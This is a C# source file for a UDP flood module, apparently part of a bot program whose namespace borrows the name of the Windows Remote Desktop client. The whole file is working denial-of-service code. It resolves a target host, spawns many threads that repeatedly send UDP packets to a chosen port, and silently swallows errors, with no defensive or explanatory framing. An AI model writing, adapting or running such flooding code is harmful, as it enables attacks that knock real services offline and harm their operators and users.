using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace mstsc.Aries.Commands.Flooders
{
    sealed class UDP
    {
        private ThreadStart[] tFloodingJob;
        private static Thread[] tFloodingThread;
        public static string sFHost;
        private static IPAddress IPEo;
        public static Int32 uPort;
        private static UDPRequest[] UDPClass;
        public static int iThreads;

        private static bool killThread;

        public  void StartUDPFlood()
        {
            killThread = false;
            try
            {
                IPEo = Dns.GetHostEntry(new Uri(sFHost).Host).AddressList[0];
            }
            catch
            {
                IPEo = IPAddress.Parse(sFHost);
            }

            tFloodingThread = new Thread[iThreads];
            tFloodingJob = new ThreadStart[iThreads];
            UDPClass = new UDPRequest[iThreads];

            for (int i = 0; i < iThreads; i++)
            {
                UDPClass[i] = new UDPRequest(IPEo, uPort);
                tFloodingJob[i] = new ThreadStart(UDPClass[i].Send);
                tFloodingThread[i] = new Thread(tFloodingJob[i]);
                tFloodingThread[i].Start();
            }
            Config.Flooding = true;
        }

        public static void StopUDPFlood()
        {
            killThread = true;
            for (int i = 0; i < iThreads; i++)
            {
                try
                {
                    tFloodingThread[i].Join(1000);
                }
                catch { }
            }
            Config.Flooding = false;
        }

        private sealed class UDPRequest
        {
            private IPAddress IPEo;
            private int Port;

            public UDPRequest(IPAddress tIPEo, int Port)
            {
                IPEo = tIPEo;
                this.Port = Port;
            }

            public void Send()
            {
                byte[] buf = new byte[512];
                IPEndPoint EndPoint = new IPEndPoint(IPEo, Port);

                try
                {
                    while (!killThread)
                    {
                        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        socket.Blocking = false;
                        socket.NoDelay = true;
                        socket.SendTo(buf, EndPoint);

                        Thread.Sleep(100);

                        if (socket.Connected) { socket.Disconnect(false); }
                        socket.Close();
                    }
                    if (killThread) { Thread.CurrentThread.Join(1000); }
                }
                catch { } //(Exception ex) { System.Windows.Forms.MessageBox.Show(ex.ToString() + "\n\n\n" + ex.Message); }
            }
        }
    }
}

